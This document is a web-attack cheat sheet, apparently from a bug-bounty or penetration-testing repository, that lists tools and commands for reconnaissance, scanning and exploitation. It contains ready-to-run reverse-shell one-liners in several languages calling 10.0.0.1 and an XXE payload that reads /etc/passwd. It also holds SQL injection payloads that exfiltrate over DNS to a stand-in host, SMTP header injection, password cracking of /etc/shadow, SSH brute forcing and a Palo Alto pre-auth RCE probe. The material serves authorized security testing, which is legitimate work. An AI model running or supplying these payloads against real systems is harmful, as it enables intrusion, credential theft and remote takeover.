# Web-Attack-Cheat-Sheet


## Discovering

### General
	https://github.com/redhuntlabs/Awesome-Asset-Discovery

### Bug Bount Targets
	https://github.com/arkadiyt/bounty-targets-data

### IP Enumeration
	http://www.asnlookup.com/
	
### Subdomain Enumeration
	https://appsecco.com/books/subdomain-enumeration/
	
	https://github.com/OWASP/Amass
		amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com

	https://github.com/projectdiscovery/subfinder
		subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com
	
	https://github.com/nsonaniya2010/SubDomainizer
		python3 SubDomainizer.py -u example.com -o dir/example.com
	
	https://dns.bufferover.run/dns?q=example.com
	
	https://crt.sh/?q=%25example.com
	
	https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
	
	https://www.shodan.io/search?query=ssl%3AExample
	
	https://www.zoomeye.org/
	
	https://securitytrails.com/list/email/dns-admin.example.com
		curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> subdomains.txt
		curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> domains.txt
	
	https://viewdns.info/reversewhois/
	
	https://opendata.rapid7.com/

### Wayback Machine
	https://github.com/tomnomnom/waybackurls
		cat subdomains.txt | waybackurls > waybackurls.txt
		
	https://github.com/tomnomnom/hacks
		cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt
	
### HTTPS or HTTP
	while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt
	while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt

### Cache
	https://www.giftofspeed.com/cache-checker/

### Crawling
	https://github.com/jaeles-project/gospider
		gospider -s "https://example.com/" -o output -c 20 -d 10

### Access target directly through IP address
	http://1.2.3.4
	https://1.2.3.4
	
	https://github.com/pielco11/fav-up
		Lookups for real IP starting from the favicon icon and using Shodan.

### Wordlist
	https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
		Wordlist Extractor
		
	https://github.com/ameenmaali/wordlistgen
		cat hosts.txt | wordlistgen
		
	https://github.com/adamtlangley/gitscraper
	
	https://github.com/danielmiessler/SecLists
	
	https://github.com/swisskyrepo/PayloadsAllTheThings
	
	https://github.com/fuzzdb-project/fuzzdb
	
	https://github.com/google/fuzzing
	
	https://github.com/xyele/hackerone_wordlist
	
	https://wordlists.assetnote.io/

### Directory Bruteforcing
	https://github.com/ffuf/ffuf
		ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'
		
	https://github.com/OJ/gobuster
		gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'

	https://github.com/tomnomnom/meg
		meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic

	https://github.com/deibit/cansina
		python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist
	
### DNS and HTTP detection
	https://ceye.io/
		curl http://api.ceye.io/v1/records?token={API Key}&type=dns
		curl http://api.ceye.io/v1/records?token={API Key}&type=http

	https://portswigger.net/burp/documentation/collaborator
		https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions
		
	http://pingb.in/
		
### Acquisitions/Names/Addresses/Contacts/Emails/etc.
	https://hunter.io
	
	https://intelx.io

	https://github.com/khast3x/h8mail
		h8mail -t target@example.com
	
	https://dashboard.fullcontact.com
	
	https://www.peopledatalabs.com

### HTML/JavaScript Comments
	Burp Engagement Tools
	
### Google Dorks
	https://www.exploit-db.com/google-hacking-database

### Content Security Policy (CSP)
	https://csp-evaluator.withgoogle.com/

### Brute Force Tiny URLs Services
	https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research

### GraphQL
	https://github.com/doyensec/graph-ql
	
	https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/

### General
	https://github.com/redhuntlabs/Awesome-Asset-Discovery
	
	https://github.com/phor3nsic/favicon_hash_shodan
		Search for a framework by favicon
		
	https://github.com/crashbrz/WebXmlExploiter/


## Enumerating

### Fingerprint
	https://github.com/urbanadventurer/WhatWeb
		whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com

	https://builtwith.com

	https://www.wappalyzer.com
	
	https://webtechsurvey.com

	https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
		Software Vulnerability Scanner Burp Extension

### Buckets
	List s3 bucket permissions and keys
		https://aws.amazon.com/cli/
			aws s3api get-bucket-acl --bucket examples3bucketname
			aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext
			aws s3api list-objects --bucket examples3bucketname
			aws s3api list-objects-v2 --bucket examples3bucketname
			aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext
			aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext
			
	Find interesting Amazon S3 Buckets by watching certificate transparency logs
		https://github.com/eth0izzle/bucket-stream
			
	Search Public Buckets
		https://buckets.grayhatwarfare.com/
		
	Burp Suite extension which can identify and test S3 buckets
		https://github.com/VirtueSecurity/aws-extender

### Enumerate permissions associated with cloud
	https://github.com/andresriancho/enumerate-iam
	
	https://github.com/nccgroup/ScoutSuite
	
	https://github.com/salesforce/cloudsplaining
	
	https://github.com/cloudsploit/scans
	
	https://github.com/RhinoSecurityLabs/pacu
	
	https://github.com/VirtueSecurity/aws-extender
	
	https://github.com/irgoncalves/gcp_security

### Visual Identification
	https://github.com/FortyNorthSecurity/EyeWitness
		eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"

	https://github.com/michenriksen/aquatone
		cat targets.txt | aquatone


## Scanning

### Burp Scanner
	https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner

### Send emails (SMTP)
	while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt
	References
		Ticket Trick https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
		Abusing autoresponders and email bounces https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2

### Search Vulnerabilities
	https://github.com/vulnersCom/getsploit
		getsploit wordpress 4.7.0
		
	https://www.exploit-db.com/searchsploit
		searchsploit -t oracle windows
		
### Web Scanning
	https://github.com/sullo/nikto
		nikto -ssl -host www.example.com

	https://github.com/wpscanteam/wpscan
		wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com
		
	https://github.com/droope/droopescan
		droopescan scan drupal -u example.com

### HTTP Request Smuggling
	https://github.com/defparam/smuggler
		python3 smuggler.py -q -u https://example.com/
		
	https://github.com/BishopFox/h2csmuggler
		h2csmuggler.py -x https://example.com/ --test
		
	https://github.com/0ang3el/websocket-smuggle
	
	https://portswigger.net/web-security/request-smuggling
	
	https://github.com/PortSwigger/http-request-smuggler
	
	https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142

### Subdomain Takeover
	https://github.com/anshumanbh/tko-subs
		tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt

	https://github.com/Ice3man543/SubOver
		SubOver -l subdomains.txt
	
### SQLi
	https://github.com/sqlmapproject/sqlmap
		sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch 
		sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch
	
### Repositories Scanning
	https://github.com/zricethezav/gitleaks
		gitleaks --github-org=organization --threads=4 -v --disk
		
	https://github.com/michenriksen/gitrob
	
	https://github.com/dxa4481/truffleHog
	
	https://github.com/awslabs/git-secrets
	
	https://github.com/eth0izzle/shhgit
	
	https://www.shhgit.com/

### Google Dorks Scanning
	https://github.com/opsdisk/pagodo
		python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1

### CORS Misconfigurations
	https://github.com/s0md3v/Corsy
		python3 corsy.py -u https://example.com


## Attacking

### Brute Force
	https://github.com/vanhauser-thc/thc-hydra
		hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh

	https://www.openwall.com/john/
		unshadow /etc/passwd /etc/shadow > mypasswd.txt
		john mypasswd.txt
		
	https://hashcat.net/hashcat/
		hashcat -m 0 -a 0 hashes.txt passwords.txt

	Rotate the source IP address in order to bypass rate limits
		https://github.com/ustayready/fireprox

### Exfiltration
	A bash script that automates the exfiltration of data over dns
		https://github.com/vp777/procrustes
		
	The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
		https://github.com/sensepost/reGeorg
		
	This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
		https://github.com/fbkcs/ThunderDNS

## Manual

### Payloads
	https://github.com/swisskyrepo/PayloadsAllTheThings
		PayloadsAllTheThings
  
	XSS
		https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
		
	XXE
		https://portswigger.net/web-security/xxe
			<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
			<stockCheck><productId>&xxe;</productId></stockCheck>
		https://phonexicum.github.io/infosec/xxe.html
			<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
		https://github.com/GoSecure/dtd-finder
			Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.

### Reusing Cookies
	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b

### SSRF
	https://lab.wallarm.com/blind-ssrf-exploitation/

### DNS Rebinding
	https://github.com/brannondorsey/dns-rebind-toolkit
	
	https://github.com/brannondorsey/whonow
	
	https://nip.io
	
	http://xip.io
	
	https://sslip.io

### SMTP Header Injection
	https://www.acunetix.com/blog/articles/email-header-injection/
		POST /contact.php HTTP/1.1
		Host: www.example2.com
 
		name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!

### Reverse Shell
	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
		Bash
			bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

		PERL
			perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

		Python
			python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

		PHP
			php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

		Ruby
			ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

		Netcat
			nc -e /bin/sh 10.0.0.1 1234
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
		Java
			r = Runtime.getRuntime()
			p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
			p.waitFor()

		xterm
			xterm -display 10.0.0.1:1
			Xnest :1
			xhost +targetip
	
	https://github.com/calebstewart/pwncat

### SQLi
	DNS Detection
		Oracle
			'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'
			'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'
			'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'
			'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'
			
		MySQL
			'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'
			
		Microsoft SQL Server
			'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'
			
		PostgreSQL
			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'

### Fake Server
	A simple HTTP Request & Response Service.
		https://httpbin.org/
		
	# HTTP
		while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done
    
	# HTTP
		python -m SimpleHTTPServer 8080
    
	# HTTP and log request headers and send response
		dummy-web-server.py 80
    
	# HTTPS
		openssl req -new -x509 -keyout test.key -out test.crt -nodes
		cat test.key test.crt > test.pem
		socat openssl-listen:443,reuseaddr,cert=test.pem,verify=0,fork stdio
	
	# FTP
		python -m pyftpdlib --directory=/tmp/dir/ --port=21
    
### General useful commands
	# Trim space and newlines on bash variable
		"${i//[$'\t\r\n ']}"

### Generic Tools
	The Cyber Swiss Army Knife
		https://gchq.github.io/CyberChef/

### Check PreAuth RCE on Palo Alto GlobalProtect
	https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
		time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null
		time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null
		time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null
